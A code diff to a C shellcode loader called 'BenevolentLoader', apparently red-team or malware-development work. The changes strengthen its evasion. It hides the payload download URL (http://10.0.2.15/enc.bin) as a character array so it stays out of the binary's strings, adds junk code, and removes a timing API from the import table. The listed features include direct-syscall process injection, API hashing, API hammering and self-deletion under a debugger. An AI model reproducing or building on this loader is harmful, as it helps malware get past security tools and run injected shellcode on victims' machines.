@@ -8,7 +8,7 @@
  * + Remote mapping injection via direct syscalls (Hell's Gate)
  * + Download encrypted payload from remote webserver
  * + Brute-force key decryption to decrypt payload
- * - No CRT + IAT Camouflage
+ * ~ No CRT + IAT Camouflage
  * + API hashing
  * + API Hammering
  * + Self-delete when debugged
@@ -26,8 +26,6 @@ VOID Banner() {
           V0.1 by @jakobfriedl\n\n"); 
 }
 
-#define URL L"http://10.0.2.15/enc.bin" 
-
 /*
  * Usage:
  *  .\BenevolentLoader.exe <process-name>
@@ -37,6 +35,13 @@ int wmain(int argc, wchar_t* argv[]) {
     // Get API hashes
     // PrintHashes();
     // return 0;
+    
+    // Random code
+    for (INT i = 0; i < 100; i++) {
+        INT k = i + 2;
+        INT j = k ^ 3; 
+        k += j; 
+    }
 
     Banner(); 
 
@@ -66,7 +71,10 @@ int wmain(int argc, wchar_t* argv[]) {
 
     /// Delay Execution via API Hammering
     // Stress = 1000 => ~ 5 seconds delay
+#ifdef VERBOSE
+    // Remote GetTickCount64() from IAT if silent mode is enabled
     DWORD T0 = GetTickCount64();
+#endif
     if (!ApiHammering(&Table, 1000)) {
         PRINT_ERROR("ApiHammering");
         return EXIT_FAILURE; 
@@ -101,7 +109,11 @@ int wmain(int argc, wchar_t* argv[]) {
     OKAY("[ 0x%p ] [ %d ] Obtained handle to process.", hProcess, dwProcessId);
 
     /// Download payload 
-    if (!Download(URL, &pShellcode, &sSize)) {
+
+    // Define the url as an array of characters, in order to not have it show up in the binary
+    wchar_t szUrl[] = { 'h', 't', 't', 'p', ':', '/', '/', '1', '0', '.', '0', '.', '2', '.', '1', '5', '/', 'e', 'n', 'c', '.', 'b', 'i', 'n', '\0' };
+
+    if (!Download(szUrl, &pShellcode, &sSize)) {
         PRINT_ERROR("Download"); 
         return EXIT_FAILURE; 
     }
